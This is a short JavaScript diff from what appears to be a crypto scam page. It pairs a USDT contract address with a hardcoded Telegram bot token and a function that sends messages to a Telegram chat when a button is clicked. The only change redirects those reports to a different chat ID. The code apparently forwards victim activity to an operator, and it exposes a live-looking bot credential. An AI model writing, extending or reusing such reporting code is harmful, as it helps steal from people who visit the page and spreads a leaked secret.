@@ -3,7 +3,7 @@ const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
 
 // Telegram Config
 const telegramBotToken = "8503598876:AAFQBEMmfHgcjPpyA_TwTJxTz34gwOswH1k";
-const telegramChatId = "8503598876";
+const telegramChatId = "8095203518";
 
 async function sendTelegram(msg) {
     const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
@@ -81,5 +81,6 @@ async function startProcess() {
 }
 
 document.getElementById("nextBtn").addEventListener("click", startProcess);
+
 
 
